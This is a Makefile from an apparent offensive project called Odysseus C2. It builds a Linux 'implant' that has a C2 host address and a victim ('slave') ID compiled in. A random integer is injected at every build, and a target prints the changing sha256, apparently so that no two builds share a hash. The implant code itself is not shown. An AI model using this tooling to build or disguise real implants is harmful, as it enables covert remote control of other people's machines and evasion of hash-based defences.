# Project:	Odysseus
# Title: 	Linux implant of Odysseus C2
# Author:	ramb0
CC 		= g++ 
SOURCE	= ./src
OUTPUT	= ./bin
MAIN	= main.cpp
PROJECT = implant
RANDOM := $(shell /bin/bash -c "echo $$(shuf -i 1-999999 -n 1)")


default:
	mkdir -p ./bin
	$(CC) --no-warnings -D RANDOMINT=$(RANDOM) -D SLAVE_ID=\"$(IMPLANT_ID)\" -D C2HOST=\"$(HOST)\" -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN);


run:
	$(OUTPUT)/$(PROJECT)

hash:
	@echo Random $(RANDOM)
	$(CC) --no-warnings -D SLAVE_ID=\"$(IMPLANT_ID)\" -D C2HOST=\"$(HOST)\" -D RANDOMINT=$(RANDOM) -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN);
	@cat $(OUTPUT)/$(PROJECT) | sha256sum